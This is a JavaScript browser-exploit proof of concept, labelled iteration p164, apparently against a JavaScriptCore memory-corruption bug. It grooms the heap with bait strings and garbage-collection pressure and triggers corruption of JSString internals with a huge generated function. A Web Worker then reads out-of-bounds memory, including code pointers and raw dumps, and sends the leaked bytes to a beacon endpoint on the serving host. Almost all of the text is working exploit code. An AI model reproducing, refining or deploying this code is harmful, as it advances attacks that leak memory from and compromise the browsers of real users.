// p164 — Shifted string sizes to break m_fiber alignment
//
// Problem: p156 corrupts JSString.m_fiber but charCodeAt still returns 0x41
// because m_data8 in the fake StringImpl still points to the original 'A' buffer.
//
// Theory: different string sizes shift StringImpl backing store alignment
// relative to the 112-byte metadata entries. If the corrupted m_fiber value
// lands on top of entry data, m_data8 reads entry bytes instead of 'A's.
//
// Test 8 sizes: 99940 to 99996, stepping by 8. Two strings each = 16 targets.
// Same bait and switch pattern as p156.
// Beacon prefix: V164-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var SIZES = [99996, 99988, 99980, 99972, 99964, 99956, 99948, 99940];
  var CHECK_OFFSETS = [0, 8, 16, 24, 32, 48, 64, 68, 72, 80, 96, 112];
  var CANARY = 0x41;

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var sizes = [];
    var baseUrl = '';
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V164-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var szList = e.data.sizes;
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';

        for (var si = 0; si < szList.length; si++) {
          var sz = szList[si];
          for (var dup = 0; dup < 2; dup++) {
            var s = '';
            for (var j = 0; j < sz; j += 1000) s += chunk;
            s = s.substring(0, sz);
            s.charCodeAt(0);
            targets.push(s);
            sizes.push(sz);
          }
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;
        var checkOffsets = e.data.checkOffsets;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== sizes[i]) {
              beacon('HIT-' + i + '-sz=' + sizes[i] + '-len=' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // Scan all corrupted strings
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          var origSz = sizes[i];

          if (len === origSz) continue;

          beacon('S' + i + '-sz=' + origSz + '-len=' + len);

          if (len <= 0 || len > 2000000) {
            beacon('S' + i + '-BADLEN');
            continue;
          }

          var maxRead = Math.min(len, 500);
          var nonCanary = '';
          var foundNon = false;

          for (var ci = 0; ci < checkOffsets.length; ci++) {
            var off = checkOffsets[ci];
            if (off >= maxRead) continue;
            try {
              var ch = targets[i].charCodeAt(off);
              nonCanary += off + ':' + hx(ch) + ',';
              if (ch !== CANARY) foundNon = true;
            } catch(e) { nonCanary += off + ':XX,'; }
          }
          beacon('CHK' + i + '-' + nonCanary.substring(0, 200));

          if (foundNon) {
            beacon('NOCANARY-' + i + '-sz=' + origSz);

            // Find first non-canary byte
            var firstNon = -1;
            for (var b = 0; b < maxRead; b++) {
              try {
                if (targets[i].charCodeAt(b) !== CANARY) { firstNon = b; break; }
              } catch(e) { break; }
            }
            if (firstNon >= 0) {
              beacon('FIRST' + i + '-off=' + firstNon);

              // Dump 16 bytes around it
              var dumpStart = Math.max(0, firstNon - 4);
              var dumpHex = '';
              for (var b = dumpStart; b < Math.min(dumpStart + 16, maxRead); b++) {
                try { dumpHex += hx(targets[i].charCodeAt(b)); }
                catch(e) { dumpHex += 'XX'; }
              }
              beacon('DUMP' + i + '-off=' + dumpStart + '-' + dumpHex);
            }

            // Read code pointer region: 8 bytes at offset 24 from first non-canary
            if (firstNon >= 0 && firstNon + 32 <= maxRead) {
              var ptr = '';
              for (var p = 7; p >= 0; p--) {
                try { ptr += hx(targets[i].charCodeAt(firstNon + 24 + p)); }
                catch(e) { ptr += 'XX'; }
              }
              beacon('CPTR' + i + '-' + ptr);
            }

            // Read bytecodeIndex: 4 bytes at offset 68 from first non-canary
            if (firstNon >= 0 && firstNon + 72 <= maxRead) {
              var bci = '';
              for (var p = 3; p >= 0; p--) {
                try { bci += hx(targets[i].charCodeAt(firstNon + 68 + p)); }
                catch(e) { bci += 'XX'; }
              }
              beacon('BCI' + i + '-' + bci);
            }

            // Full raw dump: first 112 bytes from first non-canary
            if (firstNon >= 0 && firstNon + 112 <= maxRead) {
              var rawA = '';
              for (var b = 0; b < 56; b++) {
                try { rawA += hx(targets[i].charCodeAt(firstNon + b)); }
                catch(e) { rawA += 'XX'; }
              }
              beacon('RA' + i + '-' + rawA);
              var rawB = '';
              for (var b = 56; b < 112; b++) {
                try { rawB += hx(targets[i].charCodeAt(firstNon + b)); }
                catch(e) { rawB += 'XX'; }
              }
              beacon('RB' + i + '-' + rawB);
            }
          } else {
            // All canary at check offsets, scan wider
            beacon('ALLCANARY' + i + '-sz=' + origSz);
            for (var b = 0; b < maxRead; b++) {
              try {
                if (targets[i].charCodeAt(b) !== CANARY) {
                  beacon('LATE' + i + '-off=' + b + '-v=' + hx(targets[i].charCodeAt(b)));
                  break;
                }
              } catch(e) { break; }
            }
          }
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS ──
  var N_BAIT = 20;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) bait += baitChunk;
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', sizes: SIZES });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v164fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v164ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v164ok ? 'OK' : 'FAIL'));
      if (!window.__v164fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch', checkOffsets: CHECK_OFFSETS });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v164fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
